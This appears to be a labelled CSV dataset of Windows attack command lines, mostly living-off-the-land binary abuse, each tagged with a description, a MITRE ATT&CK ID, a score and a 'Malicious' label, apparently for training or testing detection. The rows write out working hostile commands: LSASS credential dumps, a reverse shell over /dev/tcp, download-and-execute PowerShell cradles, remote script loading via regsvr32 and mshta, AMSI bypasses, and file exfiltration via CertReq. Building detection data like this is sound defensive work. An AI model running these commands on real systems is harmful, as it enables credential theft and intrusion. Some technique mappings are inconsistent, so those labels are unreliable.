"rundll32 C:\windows\system32\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""",Uses rundll32 to dump LSASS memory,Yes,Memory,Rare,Script,No,Credential Access,Used in password extraction,T1003.001,LSASS Memory,0.9,Malicious
rundll32.exe ieadvpack.dll,Uses Internet Explorer DLL to run code via rundll32,Yes,DLL,Rare,Local,No,Execution via DLL Function,Known in evasion,T1218.011,Rundll32,0.8,Malicious
rundll32.exe Mshtml.dll,Executes function from HTML rendering DLL — abused in Squiblytwo,Yes,DLL,Rare,Local,No,Script Engine Execution,Used in MSHTML abuse,T1218.010,Regsvr32,0.8,Malicious
rundll32.exe setupapi.dll,Loads setup API DLL to potentially install drivers or registry mods,Yes,DLL,Rare,Local,No,Configuration Hijack,Used in persistence,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe shell32.dll,Executes functions from shell DLL,Yes,System,Rare,Local,No,Shell Execution,Common in abuse chains,T1218.011,Rundll32,0.8,Malicious
rundll32.exe syssetup.dll,Executes DLL setup routine via rundll32,Yes,DLL,Rare,Local,No,Installation Trick,Used in setup payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe zipfldr.dll,Loads DLL from Zip Folder DLL component — potential sideload,Yes,DLL,Rare,Local,No,DLL Misuse,Seen in toolkits,T1574.002,DLL Side-Loading,0.8,Malicious
adplus.exe -hang -pn lsass.exe -o c:\users\output -quiet,Attaches debugger to LSASS to create memory dump,No,Memory,Rare,Local,No,Credential Dump,Dangerous memory operation,T1003.001,LSASS Memory,0.75,Malicious
"AgentExecutor.exe -powershell ""c:\temp\malicious.ps1"" ...",Executes PowerShell with arguments via agent launcher,No,Script,Rare,Script,No,Script Execution Abuse,Used in lateral automation,T1059.001,PowerShell,0.85,Malicious
AppVLP.exe \webdav\calc.bat,Launches remote script via AppVLP binary from WebDAV,Yes,Scripts,Rare,Remote,Yes,Remote Script Execution,Used in red team payloads,T1216,Signed Binary Proxy Execution,1,Malicious
AppVLP.exe \10.10.10.10\calc.bat,Same method via IP-based path,Yes,Scripts,Rare,Remote,Yes,App Execution Abuse,Observed in LOLBin abuse,T1216,Signed Binary Proxy Execution,1,Malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,"Launches BGInfo config silently, can be used for DLL load",Yes,DLL,Rare,Local,No,DLL Hijacking,Seen in DLL proxy attacks,T1574.001,DLL Search Order Hijacking,0.8,Malicious
cdb.exe -cf x64_calc.wds -o notepad.exe,Uses CDB debugger to launch notepad via command file,Yes,Executable,Rare,Script,No,Debugger Execution,Known in offensive simulations,T1055,Process Injection,0.9,Malicious
coregon.exe.exe /L C:\folder\evil.dll dummy_assembly_name,Loads malicious DLL via .NET utility,No,DLL,Rare,Script,No,DLL Injection,Observed in red team scripting,T1574.002,DLL Side-Loading,0.85,Malicious
coregen.exe /L C:\folder\evil.dll dummy_assembly_name,Same technique using Coregen tool,No,DLL,Rare,Script,No,Uncommon Binary Abuse,Seen in lateral payload loaders,T1218,Signed Binary Proxy Execution,0.85,Malicious
csi.exe file,Runs C# inline code via C# Interactive Shell,Yes,Scripts,Rare,Script,No,.NET Script Execution,Used in custom payload runners,T1059.005,Visual Basic,0.9,Malicious
"DefaultPack.EXE /C:""process.exe args""",Executes arbitrary process using default packager,No,Executable,Rare,Script,No,Proxy Execution,Abused in app packing,T1202,Indirect Command Execution,0.85,Malicious
"devtoolslauncher.exe LaunchForDeploy [PATH] ""args"" test",Launches development tool with potential payload,No,Executable,Rare,Script,No,Execution via Launcher,Used in embedded tools,T1218,Signed Binary Proxy Execution,0.85,Malicious
dnx.exe consoleapp,Runs .NET Core app — may hide malicious behavior,No,Executable,Rare,Script,No,Framework Loader,Seen in misused .NET packages,T1036,Masquerading,0.85,Malicious
dotnet.exe [PATH_TO_DLL],Executes DLL through .NET runtime loader,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Documented in threat emulations,T1218.012,DotNet,0.9,Malicious
Dxcap.exe -c C:\Windows\System32\notepad.exe,Uses DirectX capture tool to launch payload,No,Executable,Rare,Local,No,Signed Binary Execution,Used in sandbox bypass tests,T1218,Signed Binary Proxy Execution,0.75,Malicious
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,Opens Excel loading a remote add-in DLL,Yes,DLL,Rare,Remote,Yes,DLL Over Office,Abused in weaponized Office docs,T1137.006,Office Application Startup,1,Malicious
Mftrace.exe cmd.exe,Uses media foundation trace tool to launch cmd,No,Executable,Rare,Local,No,Binary Misuse,Abused in evasive payloads,T1218,Signed Binary Proxy Execution,0.75,Malicious
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\temp\calc.bat""",Deploys and executes command using MSDeploy,No,Executable,Rare,Script,No,Command Execution,Known in deployment abuse,T1059.003,Windows Command Shell,0.85,Malicious
msxsl.exe customers.xml script.xsl,Runs malicious XSLT script using MSXSL utility,Yes,Scripts,Rare,Script,No,Script Processor Abuse,Used in code execution chains,T1220,XSL Script Processing,0.9,Malicious
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:"" q q",Creates shadow copy of ntds.dit — potential credential theft,No,Registry,Rare,Script,No,Credential Dumping,Seen in domain attacks,T1003.003,NTDS,0.85,Malicious
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Loads PowerPoint with remote DLL for plugin hijack,Yes,DLL,Rare,Remote,Yes,Office DLL Load,Used in phishing + add-ins,T1137.006,Office Add-ins,1,Malicious
rcsi.exe bypass.csx,Executes malicious code via C# interactive script,No,Scripts,Rare,Script,No,.NET Execution,Used in toolkits for runtime eval,T1059.005,Visual Basic,0.85,Malicious
"Remote.exe /s ""powershell.exe"" anythinghere",Launches remote process using Remote.exe,No,Executable,Rare,Script,No,Execution Proxy,Abused for sandbox evasion,T1218,Signed Binary Proxy Execution,0.85,Malicious
sqldumper.exe 464 0 0x0110,Dumps process memory — can target LSASS or protected procs,Yes,Memory,Rare,Local,No,Credential Dump,Used in advanced red team flows,T1003.001,LSASS Memory,0.8,Malicious
Sqlps.exe -noprofile,Launches SQL PowerShell — often used for persistence,Yes,Scripts,Rare,Script,No,SQL Payload Execution,Used in SQL Server attacks,T1059.001,PowerShell,0.9,Malicious
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,Launches process from SQL tool PowerShell CLI,Yes,Executable,Rare,Script,No,LOLBin Execution,Observed in lateral techniques,T1059.001,PowerShell,0.9,Malicious
squirrel.exe --download [http://10.10.10.1],Downloads update/payload from remote server,No,Files,Rare,Remote,Yes,Silent Downloader,Used in trojanized apps,T1105,Ingress Tool Transfer,0.95,Malicious
squirrel.exe --update [http://10.10.10.1],Applies downloaded payload as fake update,No,Files,Rare,Remote,Yes,Update Hijack,Documented in APT abuse,T1071.001,Application Layer Protocol,0.95,Malicious
te.exe bypass.wsc,Executes script via Windows Script Component (.wsc),No,Script,Rare,Script,No,Script Component Execution,Seen in legacy script abuse,T1059,Command and Scripting Interpreter,0.85,Malicious
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Loads DLL via tracker config tool,No,DLL,Rare,Local,No,DLL Load,Rare misuse in bypass chains,T1574.002,DLL Side-Loading,0.75,Malicious
Update.exe --download [http://10.10.10.1],Performs fake update from malicious server,No,Files,Rare,Remote,Yes,Downloader Abuse,Mimics legitimate updaters,T1105,Ingress Tool Transfer,0.95,Malicious
Update.exe --update=[http://10.10.10.1],Executes downloaded payload disguised as update,No,Files,Rare,Remote,Yes,Trojanized Updater,Confirmed in APT reports,T1204.002,Malicious File,0.95,Malicious
Vsjitdebugger.exe calc.exe,Launches debugger attached to calc.exe — could be misused for execution,Yes,Executable,Rare,Local,No,Debugger Abuse,Used in offensive debugging,T1055,Process Injection,0.8,Malicious
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Opens Word document with remote malicious add-in DLL,Yes,DLL,Rare,Remote,Yes,Office Plugin Hijack,Abused in phishing kits,T1137.006,Office Application Startup,1,Malicious
wsl.exe -e /mnt/c/Windows/System32/calc.exe,Executes Windows binary from WSL context,Yes,Executable,Rare,Local,No,WSL Abuse,Seen in cross-platform bypass,T1059.004,Unix Shell,0.8,Malicious
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Uses WSL to initiate reverse shell,Yes,Network,Rare,Remote,Yes,Reverse Shell,Seen in stealth backdoors,T1059.004,Unix Shell,1,Malicious
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 runAfterCancelProcess calc.ps1,Uses PowerShell to invoke diagnostic script,No,Script,Rare,Script,No,Script Execution,Seen in evasive techniques,T1059.001,PowerShell,0.85,Malicious
set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf,Hijacks COMSPEC and uses cscript to execute payload,No,Executable,Rare,Script,No,Environment Variable Abuse,Seen in red team scenarios,T1202,Indirect Command Execution,0.85,Malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Executes script via pubprn.vbs and remote URL,Yes,Scripts,Rare,Remote,Yes,VBS Script Execution,Squiblytwo variant,T1216.001,Signed Binary Proxy Execution,1,Malicious
reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs,Imports registry and runs script for activation spoofing,Yes,Registry,Rare,Script,No,Registry and Script Abuse,Abused in malware,T1112,Modify Registry,0.9,Malicious
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985",Uses WinRM to remotely create a process,No,Executable,Rare,Remote,Yes,Remote Process Creation,Seen in lateral movement,T1021.006,Windows Remote Management,0.95,Malicious
"Pester.bat ""$null; notepad""",Abuses batch test framework to spawn notepad,No,Executable,Rare,Script,No,Test Framework Misuse,Seen in dev environments,T1059.003,Windows Command Shell,0.85,Malicious
"C:\Python27\python.exe -c ""(lambda __y: ... )()""",Executes inline Python — potentially malicious code,No,Script,Rare,Script,No,Inline Code Execution,Documented in malware dropper,T1059.006,Python,0.85,Malicious
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""...'",Opens socket in Ruby for reverse shell,No,Network,Rare,Remote,Yes,Reverse Shell via Ruby,Seen in post-exploitation,T1059.008,Network Protocols,0.95,Malicious
lua5.1 -e 'local host=...',Uses Lua interpreter to open connection or execute shell,No,Network,Rare,Remote,Yes,Scripting Abuse,Used in C2 frameworks,T1059.009,Command and Scripting Interpreter,0.95,Malicious
powershell IEX(IWR https://raw.githubusercontent.com/...Invoke-ConPtyShell.ps1),Downloads and executes reverse shell using Invoke-ConPtyShell,No,Script,Rare,Remote,Yes,PowerShell Shell Loader,Documented in payloads,T1059.001,PowerShell,0.95,Malicious
psexec \test.domain -u Domain\User -p Password ipconfig,Uses PsExec to run command on remote domain host,Yes,Executable,Rare,Remote,Yes,Lateral Execution,Classic remote admin tool,T1021.002,SMB/Windows Admin Shares,1,Malicious
"sc \10.10.10.10 create ExampleService binpath= ""c:\windows\system32\calc.exe""",Creates a service on a remote machine to execute calc,Yes,Executable,Rare,Remote,Yes,Remote Service Creation,Documented in lateral techniques,T1021.002,SMB/Windows Admin Shares,1,Malicious
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe""",Remotely starts a process using WMI,Yes,Executable,Rare,Remote,Yes,Remote Execution,Abused in lateral attacks,T1047,WMI,1,Malicious
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,Uses Windows Remote Shell to run payload,Yes,Executable,Rare,Remote,Yes,Lateral Movement,Part of admin toolset abuse,T1021.006,Windows Remote Management,1,Malicious
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,Schedules task to execute on remote machine,Yes,Executable,Rare,Remote,Yes,Task Scheduler Abuse,Known in persistence setups,T1053.005,Scheduled Task,1,Malicious
schtasks /run /tn ExampleTask /S 10.10.10.10,Runs scheduled task remotely using schtasks,Yes,Executable,Rare,Remote,Yes,Remote Task Execution,Documented in post-exploit,T1053.005,Scheduled Task,1,Malicious
schtasks /F /delete /tn ExampleTask /S host.domain,Deletes task remotely — could erase evidence,Yes,Registry,Rare,Remote,Yes,Anti-Forensics,Seen in cleanup scripts,T1070.004,File Deletion,1,Malicious
MSBuild.exe \10.10.10.10\path\to\XMLfile.xml,Executes remote MSBuild project via UNC path,Yes,Script,Rare,Remote,Yes,Remote MSBuild Abuse,Known stealth technique,T1127.001,MSBuild,1,Malicious
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""))",Instantiates COM object for MMC — could be abused,No,Script,Rare,Script,No,COM Execution via PowerShell,Used in COM hijacking,T1059.001,PowerShell,0.85,Malicious
copy C:\Windows\Temp\Malice.exe \10.10.10.10\C$\Windows\Temp,Copies malware payload to remote host,No,Files,Rare,Remote,Yes,Lateral Movement,Seen in staging routines,T1570,Lateral Tool Transfer,0.95,Malicious
mshta.exe http://malicious.domain/runme.hta,Executes remote HTA payload,Yes,Scripts,Rare,Remote,Yes,LOLBin Script Load,Common phishing tactic,T1218.005,Mshta,1,Malicious
"rundll32.exe javascript:""..\mshtml""",Executes JavaScript via rundll32 and MSHTML,Yes,Script,Rare,Local,No,LOLBin JS Abuse,Known as Squiblytwo,T1218.010,Regsvr32,0.8,Malicious
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,Executes remote COM script via regsvr32,Yes,Script,Rare,Remote,Yes,Squiblydoo,Common LOLBin attack,T1218.010,Regsvr32,1,Malicious
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed'),Disables AMSI to evade AV detection,No,Script,Rare,Local,No,Anti-Analysis,Documented in evasive malware,T1562.001,Disable or Modify Tools,0.75,Malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.ps1'),Loads PowerView from remote source,No,Script,Rare,Remote,Yes,Reconnaissance Tool,Used in domain recon,T1087,Account Discovery,0.95,Malicious
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET'...),Uses COM object to issue HTTP request — stealth download method,No,Script,Rare,Remote,Yes,Obfuscated Downloader,Used in evasive loaders,T1059.001,PowerShell,0.95,Malicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""...)",Downloads PowerUp.ps1 script — often used in privilege escalation,No,Script,Rare,Remote,Yes,PowerShell Download,Common in recon,T1059.001,PowerShell,0.95,Malicious
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData...\Rev.exe""",Downloads reverse shell to startup folder,No,Executable,Rare,Remote,Yes,Reverse Shell Setup,Confirmed red team use,T1059.001,PowerShell,0.95,Malicious
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),Encodes command in memory — used for obfuscation,No,Script,Rare,Script,No,Obfuscated Execution,Seen in staged payloads,T1027,Obfuscated Files,0.85,Malicious
powershell $encodedCommand = [Convert]::ToBase64String($bytes),Converts payload to Base64 — staging for -enc,No,Script,Rare,Script,No,Payload Encoding,Frequently abused in scripts,T1027,Obfuscated Files,0.85,Malicious
powershell Get-DomainUser,select -ExpandProperty cn,Queries domain user objects — reconnaissance,No,Script,Common,Local,No,User Enumeration,Used in domain mapping,T1087.002,0.45,Suspicious
powershell IEX(New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.ps1'),Loads PowerView from alternate server,No,Script,Rare,Remote,Yes,Recon Scripting,Red team standard tool,T1087.002,Domain Account,0.95,Malicious
sc \host.domain start ExampleService,Starts previously created remote service,Yes,Executable,Rare,Remote,Yes,Lateral Execution,Part of post-exploit chain,T1021.002,Admin Shares,1,Malicious
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,Deletes remote task — anti-forensics or cleanup,Yes,Registry,Rare,Remote,Yes,Artifact Removal,Seen in advanced persistence,T1070.004,File Deletion,1,Malicious
psexec \10.10.10.10 -u Domain\User -p Password ipconfig,Executes command remotely via PsExec,Yes,Executable,Common,Remote,Yes,Lateral Movement,Classic toolset abuse,T1021.002,SMB/Windows Admin Shares,0.8,Malicious
"powershell [Delegate]::CreateDelegate((""Func``3[String...",Constructs and invokes PowerShell functions dynamically,No,Script,Rare,Script,No,Reflective Execution,Seen in in-memory loaders,T1027.005,Non-standard Encoding,0.85,Malicious
rundll32.exe zipfldr.dll,Executes function from zip folder DLL — rarely used,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Abused in evasion scenarios,T1574.002,DLL Side-Loading,0.8,Malicious
rundll32.exe url.dll,Loads and executes from URL-handling DLL,Yes,DLL,Rare,Local,No,System DLL Execution,Used in legacy payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe setupapi.dll,Executes functions from setup DLL,Yes,DLL,Rare,Local,No,System Configuration DLL,Seen in proxy payload execution,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe shell32.dll,Commonly misused to launch various system functions,Yes,DLL,Rare,Local,No,System Execution Abuse,Observed in LOLBins,T1218.011,Rundll32,0.8,Malicious
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,Executes remote COM script via regsvr32 — Squiblydoo,Yes,Script,Rare,Remote,Yes,Remote Execution via COM,Documented in MITRE,T1218.010,Regsvr32,1,Malicious
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,Launches remote script via pubprn.vbs,Yes,Script,Rare,Remote,Yes,Script Proxy Execution,Squiblytwo class abuse,T1216.001,Signed Binary Proxy Execution,1,Malicious
"SyncAppvPublishingServer.vbs ""n;(New-Object Net.WebClient)...",Runs script embedded inside AppV server logic,Yes,Script,Rare,Remote,Yes,Scripting Abuse,Used in payload droppers,T1059.001,PowerShell,1,Malicious
rundll32.exe ieframe.dll,Executes functions from Internet Explorer frame DLL,Yes,DLL,Rare,Local,No,GUI Component Abuse,Seen in misused IE APIs,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe Mshtml.dll,Executes script engine via mshtml,Yes,Script,Rare,Local,No,MSHTML Execution,Classic Squiblytwo vector,T1218.010,Regsvr32,0.8,Malicious
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,Same COM remote script method using IP,Yes,Script,Rare,Remote,Yes,COM Script Execution,Well-known red team tactic,T1218.010,Regsvr32,1,Malicious
"wmic /node:target.domain process call create ""C:\Windows\Temp\Malice.exe""",Executes binary remotely using WMI,Yes,Executable,Rare,Remote,Yes,Remote Execution,Used in stealth deployments,T1047,WMI,1,Malicious
psexec \host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \host.domain\C$\Windows\Temp\build.xml,Executes MSBuild via PsExec from remote host,Yes,Executable,Rare,Remote,Yes,Compound LOLBin Abuse,Seen in post-exploit,T1127.001,MSBuild,1,Malicious
powershell [System.Management.Automation.AmsiUtils]::AmsiInitFailed,Disables AMSI — Anti-malware Scan Interface,No,Script,Rare,Script,No,Evasion,Critical for PowerShell attacks,T1562.001,Defense Evasion,0.85,Malicious
"powershell (New-Object Net.WebClient).DownloadString(""http://193.168.119.155/PowerUp.ps1"")",Loads privilege escalation script from remote server,No,Script,Rare,Remote,Yes,Remote Script Loader,Used in internal recon,T1059.001,PowerShell,0.95,Malicious
mshta.exe http://10.10.10.10/runme.hta,Loads HTA payload using mshta from IP,Yes,Script,Rare,Remote,Yes,LOLBin Execution,Used in phishing payloads,T1218.005,Mshta,1,Malicious
"rundll32.exe javascript:""..\mshtml""",Executes JavaScript through rundll32 and MSHTML,Yes,Script,Rare,Local,No,Script Engine Execution,Known as Squiblytwo,T1218.010,Regsvr32,0.8,Malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),Loads PowerView (obfuscated) from remote server,No,Script,Rare,Remote,Yes,Domain Recon,Common tool abuse,T1087.002,Domain Account,0.95,Malicious
regini.exe newfile.txt:hidden.ini,Updates registry config using INI file,No,Registry,Rare,Script,No,Registry Tampering,Known in misconfig attacks,T1112,Modify Registry,0.85,Malicious
"Register-cimprovider -path ""C:\folder\evil.dll""",Registers custom CIM provider for persistence,No,DLL,Rare,Script,No,WMI Abuse,Known technique for stealth persistence,T1546.003,Event Subscription,0.85,Malicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Executes .NET DLL using InstallUtil with silent flag,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Seen in red team chains,T1218.004,InstallUtil,0.9,Malicious
jsc.exe scriptfile.js,Compiles JavaScript into executable format,Yes,Scripts,Rare,Script,No,Code Compilation,Seen in obfuscated payload loaders,T1027.004,Compile After Delivery,0.9,Malicious
dotnet.exe [PATH_TO_DLL],Runs compiled DLL via dotnet CLI,Yes,DLL,Rare,Script,No,Framework Execution,Documented in .NET toolkits,T1218.012,DotNet Execution,0.9,Malicious
MSBuild.exe \host.domain\path\to\XMLfile.xml,Executes malicious MSBuild project via UNC path,Yes,Script,Rare,Remote,Yes,LOLBin Abuse,Seen in C2 frameworks,T1127.001,MSBuild,1,Malicious
rundll32.exe setupapi.dll,Executes function from setup API DLL,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Confirmed LOLBin use,T1218.011,Rundll32,0.8,Malicious
rundll32.exe url.dll,Loads URL handler DLL — may be abused for redirection,Yes,DLL,Rare,Local,No,URL-based DLL Execution,Used in evasive payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe zipfldr.dll,Executes from Zip folder DLL component,Yes,DLL,Rare,Local,No,System Component Execution,Rare LOLBin usage,T1218.011,Rundll32,0.8,Malicious
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,Loads script via pubprn using IP-based source,Yes,Script,Rare,Remote,Yes,LOLBin Script Execution,Known Squiblytwo variant,T1216.001,Signed Binary Proxy Execution,1,Malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Same technique using FQDN,Yes,Script,Rare,Remote,Yes,Scripting Proxy,Observed in phishing chains,T1216.001,Signed Binary Proxy Execution,1,Malicious
copy C:\Users\Administrator\Downloads\build.xml \10.10.10.10\C$\Windows\Temp,Transfers malicious MSBuild project to remote system,No,Files,Rare,Remote,Yes,Lateral Tool Staging,Common in red team ops,T1570,Lateral Tool Transfer,0.95,Malicious
powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://some.url/script.ps1'),In-memory execution of external PowerShell script,No,Script,Rare,Remote,Yes,Script Loader,Used in fileless malware,T1059.001,PowerShell,0.95,Malicious
cscript.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4,Uses VBS to query process via WinRM,Yes,Script,Rare,Local,No,Scripting and Recon,Seen in lateral movement,T1047,WMI,0.8,Malicious
sc \10.10.10.10 start ExampleService,Starts malicious service remotely,Yes,Executable,Rare,Remote,Yes,Remote Service Abuse,Classic lateral execution,T1021.002,Admin Shares,1,Malicious
"Mshta.exe ""C:\ads\file.txt:file.hta""",Executes HTA embedded in alternate data stream,Yes,Script,Rare,Local,No,ADS Execution,Seen in stealth dropper chains,T1564.004,Hidden Files and ADS,0.8,Malicious
rasautou -d powershell.dll -p powershell -a a -e e,Launches PowerShell DLL via Remote Access Auto Connection,No,DLL,Rare,Script,No,UAC Bypass Vector,Used in bypass frameworks,T1547.001,Registry Modification,0.85,Malicious
rundll32.exe AllTheThingsx64,Executes exported function in custom DLL,Yes,DLL,Rare,Script,No,DLL Execution,Confirmed execution method,T1218.011,Rundll32,0.9,Malicious
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Dumps registry into alternate data stream,Yes,Registry,Rare,Script,No,Data Obfuscation,Used in persistence staging,T1564.004,Hidden Files and ADS,0.9,Malicious
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extracts executable via extrac32 — abuse for duplication,Yes,Files,Rare,Script,No,Binary Proxy Execution,Observed in evasive toolchains,T1218,Signed Binary Proxy Execution,0.9,Malicious
extrac32 /Y /C \webdavserver\share\test.txt C:\folder\test.txt,Pulls file from WebDAV — possible staging,Yes,Files,Rare,Remote,Yes,Remote File Transfer,Known in staging payloads,T1105,Ingress Tool Transfer,1,Malicious
ilasm.exe C:\public\test.txt /exe,Compiles IL assembly to EXE,Yes,Executable,Rare,Script,No,Payload Compilation,Seen in obfuscated loaders,T1027.004,Compile After Delivery,0.9,Malicious
ie4uinit.exe -BaseSettings,IE configuration tool — misused in UAC bypass,Yes,Registry,Rare,Local,No,LOLBin Initialization Abuse,Abused for elevation,T1548.002,Bypass UAC,0.8,Malicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,Executes external EXE via IE execution host,Yes,Executable,Rare,Remote,Yes,Remote Execution,Seen in phishing attacks,T1218.005,Mshta,1,Malicious
explorer.exe /root,"Launches Explorer shell view (low threat, possibly suspicious)",Yes,System,Common,Local,No,GUI Execution,Minimal threat but logged,T1005,Data from Local System,0.6,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript via database utility,Yes,Files,Rare,Script,No,Alternate Copy Method,Observed in red team kits,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Uses connection manager to execute remote INF,Yes,Scripts,Rare,Remote,Yes,LOLBin Execution,Abused in phishing & C2,T1218.003,CMSTP,1,Malicious
cscript c:\ads\file.txt:script.vbs,Executes VBScript from ADS via cscript,Yes,Scripts,Rare,Script,No,ADS Script Execution,Used in stealth payloads,T1564.004,Hidden Files and ADS,0.9,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/encodedfile,Writes system binary from URL,Yes,Files,Rare,Remote,Yes,Binary Dropper,Used in remote execution,T1105,Ingress Tool Transfer,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts local file contents in request — data exfil vector,Yes,Files,Rare,Remote,Yes,Covert Exfiltration,Seen in phishing frameworks,T1041,Exfiltration Over C2,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/encodedfile,Transfers file to system32 via service utility,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in remote file drops,T1105,Ingress Tool Transfer,1,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Configures DNS server to load remote DLL,Yes,DLL,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
eventvwr.exe,Launches Event Viewer — can be used in UAC bypass,Yes,Executable,Rare,Local,No,Privilege Escalation,Used in UAC evasion,T1548.002,Bypass User Account Control,0.8,Malicious
diskshadow> exec calc.exe,Executes program via diskshadow script context,Yes,Executable,Rare,Local,No,Shadow Copy Execution,Known in ransomware attacks,T1003.003,NTDS,0.8,Malicious
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt,Downloads script to alternate data stream,Yes,Script,Rare,Remote,Yes,ADS Delivery,Used in fileless malware,T1564.004,Hidden Files and ADS,1,Malicious
bash.exe -c calc.exe,Launches Windows binary via bash — WSL abuse,Yes,Executable,Rare,Local,No,Cross-platform Execution,Seen in stealth loaders,T1059.004,Unix Shell,0.8,Malicious
ATBroker.exe /start malware,Executes payload via accessibility tool,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in privilege escalation,T1546.008,Accessibility Features,0.8,Malicious
AT.exe at 09:00 /interactive /every:m,Creates scheduled task using legacy tool,Yes,System,Rare,Local,No,Task Scheduling,Observed in early malware,T1053.002,At,0.8,Malicious
"rundll32 ""C:\ads\file.txt:ADSDLL.dll""",Executes DLL embedded in alternate data stream,Yes,DLL,Rare,Local,No,ADS DLL Execution,Used in stealth backdoors,T1564.004,Hidden Files and ADS,0.8,Malicious
rundll32.exe shdocvw.dll,Loads shell document DLL — rarely abused,Yes,DLL,Rare,Local,No,DLL Function Execution,Rare but logged in some payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe syssetup.dll,Executes setup-based DLLs,Yes,DLL,Rare,Local,No,Setup Routine Abuse,Seen in stealth installers,T1218.011,Rundll32,0.8,Malicious
rundll32 syssetup.dll,Alternate invocation of system setup DLL,Yes,DLL,Rare,Local,No,UAC Abuse,Documented in privilege abuse,T1548.002,Bypass UAC,0.8,Malicious
Msconfig.exe -5,Launches msconfig with suspicious flag,Yes,Executable,Rare,Local,No,Parameter Abuse,Minimal but trackable,T1202,Indirect Command Execution,0.8,Malicious
expand c:\ADS\file1.bat c:\ADS\file2.bat,Uses expand to duplicate file within ADS,Yes,Files,Rare,Local,No,ADS Write Abuse,Known stealth move,T1564.004,Hidden Files and ADS,0.8,Malicious
expand \10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat,Transfers and writes remote batch into ADS,Yes,Files,Rare,Remote,Yes,Network Payload Transfer,Used in lateral payload staging,T1105,Ingress Tool Transfer,1,Malicious
hh.exe http://some.url/script.ps1,Executes external PowerShell script via HTML Help,Yes,Script,Rare,Remote,Yes,LOLBin Script Launcher,Seen in Squiblydoo variants,T1218.005,Mshta,1,Malicious
regsvcs.exe AllTheThingsx64.dll,Executes .NET DLL via RegSvcs binary,Yes,DLL,Rare,Script,No,DLL Loader Abuse,Classic LOLBin execution,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\beacon.exe,Uses Defender CLI to fetch malicious file,Yes,Executable,Rare,Remote,Yes,LOLBin Downloader,Known in fileless delivery,T1105,Ingress Tool Transfer,1,Malicious
